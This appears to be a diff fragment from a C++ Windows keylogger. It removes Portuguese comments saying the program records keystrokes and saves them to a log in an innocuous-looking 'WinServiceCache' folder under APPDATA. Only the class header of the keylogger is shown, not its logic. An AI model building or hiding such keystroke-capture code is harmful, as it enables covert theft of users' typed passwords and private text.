@@ -7,10 +7,6 @@
 #include <mutex>
 #include <Windows.h>
 
-// Exemplo de keylogger em C++ usando Windows API. O código captura as teclas pressionadas e as salva em um arquivo de log.
-// O arquivo é criado no diretório "WinServiceCache" dentro do APPDATA do usuário, ou em um local alternativo se o APPDATA não estiver disponível.
-// O keylogger utiliza um buffer para armazenar as teclas antes de salvá-las no arquivo, e traduz as teclas especiais para uma representação legível.
-
 namespace fs = std::filesystem;
 
 class KeyLogger {
